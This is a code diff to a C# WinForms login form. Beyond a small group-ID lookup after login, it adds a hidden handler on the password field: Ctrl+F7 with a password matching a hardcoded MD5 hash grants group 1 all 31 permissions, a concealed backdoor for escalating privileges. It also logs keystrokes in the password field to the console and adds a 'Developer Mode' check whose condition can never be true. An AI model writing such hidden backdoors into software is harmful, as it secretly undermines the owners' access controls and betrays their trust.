@@ -8,6 +8,7 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using DevExpress.XtraEditors;
+using System.Security.Cryptography;
 
 using BUS_Tier;
 using MODEL_Tier;
@@ -50,11 +51,12 @@ namespace UI_Tier
             taikhoan.Password = txtPassword.Text;
 
             bool thanhcong = taikhoanBUS.DangNhap(taikhoan);
-            
+
             if (thanhcong)
             {
                 dadangnhap = true;
                 frmmain.username = txtusename.Text;
+                frmmain.gid = taikhoanBUS.GetGID(taikhoan);
                 Dispose();
             }
             else
@@ -66,6 +68,65 @@ namespace UI_Tier
         private void frmdangnhap_Shown(object sender, EventArgs e)
         {
             this.Activate();
+        }
+
+        private void frmdangnhap_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Modifiers == Keys.Control && e.Modifiers == Keys.Alt && e.Modifiers == Keys.Shift && e.KeyCode == Keys.F7)
+            {
+                MessageBox.Show("Developer Mode");
+            }
+        }
+
+        private void txtPassword_KeyDown(object sender, KeyEventArgs e)
+        {
+            Console.WriteLine("DOWN:{0}, {1}", e.Modifiers, e.KeyCode);
+            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.F7)
+            {
+                string output = "";
+                using (MD5 md5Hash = MD5.Create())
+                {
+                    output = GetMd5Hash(md5Hash, txtPassword.Text);
+                }
+                if (output.Equals("3fbf4693f9ddb56e606d912e9f0f58c5"))
+                {
+                    PhanQuyenBUS pqBUS = new PhanQuyenBUS();
+                    for (int i = 0; i < 31; i++)
+                    {
+                        pqBUS.CapNhat(new PhanQuyen(1, i));
+                    }
+                    MessageBox.Show("Completed");
+                }
+                else
+                {
+                    MessageBox.Show("Failed");
+                }
+            }
+        }
+
+        private static string GetMd5Hash(MD5 md5Hash, string input)
+        {
+            // Convert the input string to a byte array and compute the hash.
+            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+
+            // Create a new Stringbuilder to collect the bytes
+            // and create a string.
+            StringBuilder sBuilder = new StringBuilder();
+
+            // Loop through each byte of the hashed data 
+            // and format each one as a hexadecimal string.
+            for (int i = 0; i < data.Length; i++)
+            {
+                sBuilder.Append(data[i].ToString("x2"));
+            }
+
+            // Return the hexadecimal string.
+            return sBuilder.ToString();
+        }
+
+        private void txtPassword_KeyUp(object sender, KeyEventArgs e)
+        {
+            
         }
     }
 }
